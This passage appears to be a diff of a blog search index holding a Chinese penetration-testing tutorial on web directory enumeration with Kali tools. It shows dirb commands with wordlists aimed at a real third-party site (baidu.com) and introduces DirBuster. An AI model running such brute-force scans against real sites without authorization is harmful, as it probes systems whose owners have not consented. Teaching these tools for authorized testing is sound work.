+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用/usr/share/wordlists/dirb/big.txt字典来扫描Web服务</span></span><br><span class="line">dirb https://www.baidu.com /usr/share/wordlists/dirb/big.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将扫描结果保存到文件中</span></span><br><span class="line">dirb https://www.baidu.com -o output.txt /usr/share/wordlists/dirb/big.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列举指定后缀名目录</span></span><br><span class="line">dirb https://www.baidu.com -X .php /usr/share/wordlists/dirb/big.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加毫秒延迟，避免洪水攻击（单位是毫秒）</span></span><br><span class="line">dirb https://www.baidu.com/ -z <span class="number">100</span></span><br></pre></td></tr></table></figure>
+<p>扩展：<br />common.txt被设置为目录遍历的默认单词列表，后期可以把自己觉得好的目录名字，追加到这个字典中，进一步完善字典（路径：&#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt）</p>
+<p><a name="FP4fr"></a></p>
+<h1 id="二、kali自带扫描工具-dirbuster"><a href="#二、kali自带扫描工具-dirbuster" class="headerlink" title="二、kali自带扫描工具-dirbuster"></a>二、kali自带扫描工具-dirbuster</h1><blockquote>
+<p> DirBuster目录扫描工具支持全部的Web目录扫描方式。它既支持网页爬虫方式扫描，也支持基于字典暴力扫描，还支持纯暴力扫描。这个软件kali系统自带有，我们可以直接使用，操作也很简单。  </p>
+</blockquote>
+<p><img src="/images/1683109509530-b39c805b-c26d-4adb-84e4-2ea1f54ba74e.png" alt="1683109509530-b39c805b-c26d-4adb-84e4-2ea1f54ba74e.png"></p>
+<p><img src="/images/4ef82c6e023542719ddab478fef94e64.png" alt="4ef82c6e023542719ddab478fef94e64"><img src="/images/803e21b689974a809e1d20efa76eb114.png" alt="803e21b689974a809e1d20efa76eb114"></p>
+<h1 id="三、其它扫描工具–gobuster、dirsearch、nikto"><a href="#三、其它扫描工具–gobuster、dirsearch、nikto" class="headerlink" title="三、其它扫描工具–gobuster、dirsearch、nikto"></a>三、其它扫描工具–gobuster、dirsearch、nikto</h1><p>后续学习</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+</search>
